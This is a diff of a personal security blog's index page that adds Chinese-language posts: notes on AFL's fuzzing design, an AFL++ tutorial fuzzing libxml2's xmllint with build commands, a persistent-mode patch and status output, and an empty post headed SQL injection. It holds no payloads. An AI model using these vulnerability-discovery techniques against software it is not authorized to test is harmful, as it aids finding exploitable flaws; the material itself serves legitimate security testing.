@@ -133,7 +133,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -173,6 +173,381 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://dfault0.github.io/2021/11/08/AFL-fuzz-whitepaper/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dfault0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dfault0's blog">
+      <meta itemprop="description" content="I CAN">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Dfault0's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/08/AFL-fuzz-whitepaper/" class="post-title-link" itemprop="url">AFL fuzz whitepaper</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-11-08 10:45:10" itemprop="dateCreated datePublished" datetime="2021-11-08T10:45:10+08:00">2021-11-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-18 16:40:18" itemprop="dateModified" datetime="2022-03-18T16:40:18+08:00">2022-03-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Fuzzing/" itemprop="url" rel="index"><span itemprop="name">Fuzzing</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Technical-“whitepaper”-for-afl-fuzz"><a href="#Technical-“whitepaper”-for-afl-fuzz" class="headerlink" title="Technical “whitepaper” for afl-fuzz"></a>Technical “whitepaper” for afl-fuzz</h1><h2 id="Design-statement"><a href="#Design-statement" class="headerlink" title="Design statement"></a>Design statement</h2><p>该工具可以被认为是黑客的集合（可以在实际中测试），是有效的，并且是已实现的，最健壮的工具。</p>
+<p>原则：速度、可靠性、易使用</p>
+<h2 id="Coverage-measurements"><a href="#Coverage-measurements" class="headerlink" title="Coverage measurements"></a>Coverage measurements</h2><p>这个插桩注入到编译好的程序来获取分支覆盖率</p>
+<p>注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; 1;</span><br></pre></td></tr></table></figure>
+
+<p>cur_location是随机生成来简化链接复杂项目的并且保持XOR输出均匀分布。</p>
+<p>shared_mem[]是64KB的一个共享内存区域，被调用者传递给插桩二进制</p>
+<p>输出映射中设置的每个字节都可以看作是插入指令的代码中特定（branch_src，branch_dst）元组的命中</p>
+<p>coverage的形式：元组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)</span><br><span class="line">A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)</span><br></pre></td></tr></table></figure>
+
+<p>这有助于发现底层代码中的细微故障条件，因为安全漏洞通常与意外或不正确的状态转换相关，而不仅仅是与到达新的基本块相关。</p>
+<h2 id="Detecting-new-behaviors"><a href="#Detecting-new-behaviors" class="headerlink" title="Detecting new behaviors"></a>Detecting new behaviors</h2><p>fuzzer维护在以前的执行中看到的元组的全局映射，可以与单路径进行快速比较，并且使用简单的循环和几条简单的之类就可以进行更新。</p>
+<p>当一个变异之后的输入的执行路径包含新的元组的时候，该输入便会被保留下来。否则将会被丢弃，即使他们的控制流图是唯一的。</p>
+<p>这种方法允许对程序状态进行非常细粒度和长期的探索，而不必对复杂的执行跟踪执行任何计算密集和脆弱的全局比较，同时避免了路径爆炸。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#1: A -&gt; B -&gt; C -&gt; D -&gt; E</span><br><span class="line">#2: A -&gt; B -&gt; C -&gt; A -&gt; E</span><br><span class="line">#2包含了新的元组（CA, AE），所以他是新的</span><br><span class="line">#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E</span><br><span class="line">但是#3不是unique的</span><br></pre></td></tr></table></figure>
+
+<p>此外除了考虑新的元组外，AFL还粗略统计了到达的元组数目，他们被分到下面的几个区间bucket：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+</span><br></pre></td></tr></table></figure>
+
+<p>bucket的数量是一个实现工件：它允许将插装生成的8位计数器就地映射到fuzzer可执行文件依赖的8位位图，以跟踪每个元组已经看到的执行计数。bucket之内的变化会被忽略。</p>
+<h2 id="Evolving-the-input-queue"><a href="#Evolving-the-input-queue" class="headerlink" title="Evolving the input queue"></a>Evolving the input queue</h2><p>已经变异了的测试用例，如果产生一个新的状态，就会被添加到输入队列中，并且作为将来的fuzzing的一个开始点。</p>
+<p>这个方法主要是为了让AFL探索分散的和尽可能多不可比的数据格式特点。</p>
+<h2 id="Culling-the-corpus"><a href="#Culling-the-corpus" class="headerlink" title="Culling the corpus"></a>Culling the corpus</h2><p>AFL为了保证效率，AFL会定期重新评估输入队列，选出测试用例的一个子集，同时可以保证任然可以覆盖每个元组。</p>
+<p>算法原理：为每个队列分配一个于其执行文件大小成比例的分数，然后为每个元组选择得分最低的候选项。</p>
+<p>元组的处理流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Find next tuple not yet in the temporary working set,</span><br><span class="line"></span><br><span class="line">2) Locate the winning queue entry for this tuple,</span><br><span class="line"></span><br><span class="line">3) Register *all* tuples present in that entry&#x27;s trace in the working set,</span><br><span class="line"></span><br><span class="line">4) Go to #1 if there are any missing tuples in the set.</span><br></pre></td></tr></table></figure>
+
+<p>被判断成favored的实体，通常比原始数据集小5-10倍。被判断成non-favored的实体不会被丢弃，只是当遇见的时候会有一定的概率跳过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- If there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.</span><br><span class="line"></span><br><span class="line">- If there are no new favorites:</span><br><span class="line"></span><br><span class="line">  - If the current non-favored entry was fuzzed before, it will be skipped 95% of the time.</span><br><span class="line"></span><br><span class="line">  - If it hasn&#x27;t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.</span><br></pre></td></tr></table></figure>
+
+<p>this provides a reasonable balance between queue cycling speed and test case diversity.</p>
+<p>afl-cmin: 稍微有点复杂，但是更慢的一个缩减方法。</p>
+<h2 id="Trimming-input-files"><a href="#Trimming-input-files" class="headerlink" title="Trimming input files"></a>Trimming input files</h2><p>有些类型的变异策略可能会迭代增加生成文件的大小。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trimmer </span><br></pre></td></tr></table></figure>
+
+<p>afl-tmin：是独立运行的，使用更详尽的迭代算法，还尝试对修剪过的文件执行字母表规范化。</p>
+<p>他的操作如下：</p>
+<ul>
+<li>首先，这个工具自动选择工作模式。如果初始化输入让目标二进制文件崩溃，afl-min将会使用未插桩的模式，并且简单对输入进行调整（产生更加简单的文件，但是任然是可以产生crash）；如果目标没有崩溃，他就会使用插桩的模式，并且保持调整（产生同样的执行路径）。</li>
+</ul>
+<p>实际的算法是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1) Attempt to zero large blocks of data with large stepovers. Empirically, this is shown to reduce the number of execs by preempting finer-grained efforts later on.</span><br><span class="line"></span><br><span class="line">2) Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style. </span><br><span class="line"></span><br><span class="line">3) Perform alphabet normalization by counting unique characters and trying to bulk-replace each with a zero value.</span><br><span class="line"></span><br><span class="line">4) As a last result, perform byte-by-byte normalization on non-zero bytes.</span><br><span class="line">- Sequential bit flips with varying lengths and stepovers,</span><br><span class="line"></span><br><span class="line">- Sequential addition and subtraction of small integers,</span><br><span class="line"></span><br><span class="line">- Sequential insertion of known interesting integers (0, 1, INT_MAX, etc),</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://dfault0.github.io/2021/11/05/afl-fuzz-libxml2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dfault0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dfault0's blog">
+      <meta itemprop="description" content="I CAN">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Dfault0's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/05/afl-fuzz-libxml2/" class="post-title-link" itemprop="url">afl fuzz libxml2</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-11-05 10:45:34" itemprop="dateCreated datePublished" datetime="2021-11-05T10:45:34+08:00">2021-11-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-18 16:40:11" itemprop="dateModified" datetime="2022-03-18T16:40:11+08:00">2022-03-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/fuzzing/" itemprop="url" rel="index"><span itemprop="name">fuzzing</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="使用AFL-模糊测试libxml2"><a href="#使用AFL-模糊测试libxml2" class="headerlink" title="使用AFL++模糊测试libxml2"></a>使用AFL++模糊测试libxml2</h1><h2 id="简单模糊测试"><a href="#简单模糊测试" class="headerlink" title="简单模糊测试"></a>简单模糊测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在这里的时候需要用绝对路径相对路径是会报错的。</span><br><span class="line">/home/fourth/fuzz</span><br><span class="line">$ make CC=/home/fourth/fuzz/AFLplusplus/afl-clang-fast CXX=/home/fourth/fuzz/AFLplusplus/afl-clang-fast++ LD=/home/fourth/fuzz/AFLplusplus/afl-clang-fast</span><br><span class="line"></span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i ./in -o ./out -m none -d -- ./xmlint_cov @@</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 3 min, 47 sec      │  cycles done : 0     │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 1 sec       │  total paths : 1710  │</span><br><span class="line">│ last uniq crash : none seen yet                     │ uniq crashes : 0     │</span><br><span class="line">│  last uniq hang : none seen yet                     │   uniq hangs : 0     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 1558.1 (91.1%)     │    map density : 1.00% / 4.98%      │</span><br><span class="line">│ paths timed out : 0 (0.00%)          │ count coverage : 3.23 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : havoc                  │ favored paths : 330 (19.30%)        │</span><br><span class="line">│ stage execs : 25.4k/32.8k (77.41%)   │  new edges on : 509 (29.77%)        │</span><br><span class="line">│ total execs : 1.24M                  │ total crashes : 0 (0 unique)        │</span><br><span class="line">│  exec speed : 5649/sec               │  total tmouts : 1 (1 unique)        │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 9         │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 1435      │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 109       │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 1707      │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 1173/890k, 526/285k                  │ stability : 96.68%    │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 18.12%/6877, disabled                │          [cpu000:150%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h2 id="persistent-mode"><a href="#persistent-mode" class="headerlink" title="persistent mode"></a>persistent mode</h2><p>使用AFL++ 的persistent mode来加速fuzz</p>
+<p>首先需要改写我们的主程序代码xmllint.c，其中带<code>+</code>的就是需要重新添加的。一般是循环10000次，是我自己少写了一个0，并且一般就是只需要修改的是main函数，然后把原来的main函数改一个名字即可。</p>
+<p><code>__AFL_LOOP</code>就是告诉AFL，我们需要用到的是persistent mode。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ diff -u a/xmllint.c b/xmllint.c &gt; ./b/diff.patch</span><br><span class="line"></span><br><span class="line">***@ubuntu:~/fuzz/libxml2$ <span class="built_in">cat</span> ./b/diff.patch</span><br><span class="line">--- a/xmllint.c	2021-11-08 18:20:14.461467630 -0800</span><br><span class="line">+++ b/xmllint.c	2021-11-08 19:01:45.680069687 -0800</span><br><span class="line">@@ -3131,7 +3131,13 @@</span><br><span class="line">     int files = 0;</span><br><span class="line">     int version = 0;</span><br><span class="line">     const char* indent;</span><br><span class="line">-</span><br><span class="line">+    </span><br><span class="line">+    <span class="keyword">if</span>(argc&lt;2)</span><br><span class="line">+    	<span class="built_in">return</span> 1;</span><br><span class="line">+    <span class="keyword">while</span>(__AFL_LOOP(1000))</span><br><span class="line">+    	parseAndPrintFile(argv[1],NULL);</span><br><span class="line">+    <span class="built_in">return</span> 0;</span><br><span class="line">+    </span><br><span class="line">     <span class="keyword">if</span> (argc &lt;= 1) &#123;</span><br><span class="line"> 	usage(stderr, argv[0]);</span><br><span class="line"> 	<span class="built_in">return</span>(1);</span><br><span class="line"> 一般是需要改成下面的这个样子的 	</span><br><span class="line">+int main(int argc, char** argv) &#123;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (argc &lt; 2) <span class="built_in">return</span> 1;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">while</span> (__AFL_LOOP(10000))</span><br><span class="line">+    parseAndPrintFile(argv[1], NULL);</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">return</span> 0;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> int</span><br><span class="line">-main(int argc, char **argv) &#123;</span><br><span class="line">+old_main(int argc, char **argv) &#123;</span><br><span class="line">     int i, acount;</span><br><span class="line">     int files = 0;</span><br><span class="line">     int version = 0;</span><br></pre></td></tr></table></figure>
+
+<p>记住，在编译之前一定要先 <code>make clean</code> 否则会报错。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../fuzz</span><br><span class="line">$ <span class="built_in">rm</span> xmllint</span><br><span class="line">$ make CC=~/AFLplusplus/afl-clang-fast CXX=~/AFLplusplus/afl-clang-fast++ LD=~/AFLplusplus/afl-clang-fast</span><br><span class="line">$ <span class="built_in">cp</span> xmllint ../fuzz/xmllint_persistent</span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i <span class="keyword">in</span>/ -o out -m none -d -- ./xmllint_persistent @@</span><br></pre></td></tr></table></figure>
+
+<p>可以看到模糊测试的速度大致提升了200倍。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">               american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│        run time : 0 days, 3 hrs, 22 min, 41 sec     │  cycles done : 3     │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 48 sec      │  total paths : 4212  │</span><br><span class="line">│ last uniq crash : none seen yet                     │ uniq crashes : 0     │</span><br><span class="line">│  last uniq hang : none seen yet                     │   uniq hangs : 0     │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│  now processing : 2166.3 (51.4%)     │    map density : 1.34% / 6.66%      │</span><br><span class="line">│ paths timed out : 0 (0.00%)          │ count coverage : 4.38 bits/tuple    │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│  now trying : havoc                  │ favored paths : 508 (12.06%)        │</span><br><span class="line">│ stage execs : 1212/5299 (22.87%)     │  new edges on : 863 (20.49%)        │</span><br><span class="line">│ total execs : 35.7M                  │ total crashes : 0 (0 unique)        │</span><br><span class="line">│  exec speed : 4039/sec               │  total tmouts : 2711 (233 unique)   │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│   bit flips : disabled (default, enable with -D)   │    levels : 24        │</span><br><span class="line">│  byte flips : disabled (default, enable with -D)   │   pending : 2707      │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D)   │  pend fav : 0         │</span><br><span class="line">│  known ints : disabled (default, enable with -D)   │ own finds : 4209      │</span><br><span class="line">│  dictionary : n/a                                  │  imported : 0         │</span><br><span class="line">│havoc/splice : 2467/16.6M, 1742/18.9M               │ stability : 97.27%    │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘</span><br><span class="line">│    trim/eff : 13.36%/188k, disabled                │          [cpu000:150%]</span><br><span class="line">└────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h2 id="QEMU-mode"><a href="#QEMU-mode" class="headerlink" title="QEMU mode"></a>QEMU mode</h2><p>假设我们没有源代码，所以就不能对源代码进行打补丁，所以我们就只能使用QEMU模式来对二进制文件来进行插桩。</p>
+<p>首先需要的是编译程序（需要恢复对之前源代码的操作）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../libxml2</span><br><span class="line">$ make clean</span><br><span class="line">$ make</span><br><span class="line">$ <span class="built_in">cp</span> xmllint ../fuzz/</span><br><span class="line">$ ../AFLplusplus/afl-fuzz -i <span class="keyword">in</span>/ -o out -m none -d -Q -- ./xmllint @@</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">           american fuzzy lop ++3.15a (default) [fast] &#123;0&#125;</span><br><span class="line">┌─ process timing ────────────────────────────────────┬─ overall results ────┐</span><br><span class="line">│ run time : 0 days, 19 hrs, 48 min, 42 sec │ cycles done : 0 │</span><br><span class="line">│ last new path : 0 days, 0 hrs, 0 min, 35 sec │ total paths : 3332 │</span><br><span class="line">│ last uniq crash : none seen yet │ uniq crashes : 0 │</span><br><span class="line">│ last uniq hang : 0 days, 0 hrs, 41 min, 25 sec │ uniq hangs : 2 │</span><br><span class="line">├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤</span><br><span class="line">│ now processing : 2335.9 (70.1%) │ map density : 3.47% / 11.94% │</span><br><span class="line">│ paths timed out : 0 (0.00%) │ count coverage : 3.53 bits/tuple │</span><br><span class="line">├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤</span><br><span class="line">│ now trying : splice 8 │ favored paths : 445 (13.36%) │</span><br><span class="line">│ stage execs : 51/110 (46.36%) │ new edges on : 807 (24.22%) │</span><br><span class="line">│ total execs : 10.5M │ total crashes : 0 (0 unique) │</span><br><span class="line">│ exec speed : 244.3/sec │ total tmouts : 4802 (272 unique) │</span><br><span class="line">├─ fuzzing strategy yields ────────────┴─────────────┬─ path geometry ───────┤</span><br><span class="line">│ bit flips : disabled (default, enable with -D) │ levels : 24 │</span><br><span class="line">│ byte flips : disabled (default, enable with -D) │ pending : 2401 │</span><br><span class="line">│ arithmetics : disabled (default, enable with -D) │ pend fav : 0 │</span><br><span class="line">│ known ints : disabled (default, enable with -D) │ own finds : 3329 │</span><br><span class="line">│ dictionary : n/a │ imported : 0 │</span><br><span class="line">│havoc/splice : 2147/5.38M, 1182/5.04M │ stability : 98.82% │</span><br><span class="line">│py/custom/rq : unused, unused, unused, unused ├───────────────────────┘</span><br><span class="line">│ trim/eff : 12.08%/53.4k, disabled │ [cpu000:750%]</span><br><span class="line">└────────────────────────────────────────────────────┘^C</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>git clone 不行就是因为终端没有走代理，设置一些即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config –global http.proxy “192.168.1.238:1080”</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://aflplus.plus/docs/tutorials/libxml2_tutorial/">https://aflplus.plus/docs/tutorials/libxml2_tutorial/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://dfault0.github.io/2021/10/28/xiaodiPenetration/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dfault0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dfault0's blog">
+      <meta itemprop="description" content="I CAN">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Dfault0's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/28/xiaodiPenetration/" class="post-title-link" itemprop="url">xiaodiPenetration</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-28 10:46:49" itemprop="dateCreated datePublished" datetime="2021-10-28T10:46:49+08:00">2021-10-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-18 16:40:58" itemprop="dateModified" datetime="2022-03-18T16:40:58+08:00">2022-03-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Penetration/" itemprop="url" rel="index"><span itemprop="name">Penetration</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154745441.png" alt="image-20211004154745441"></p>
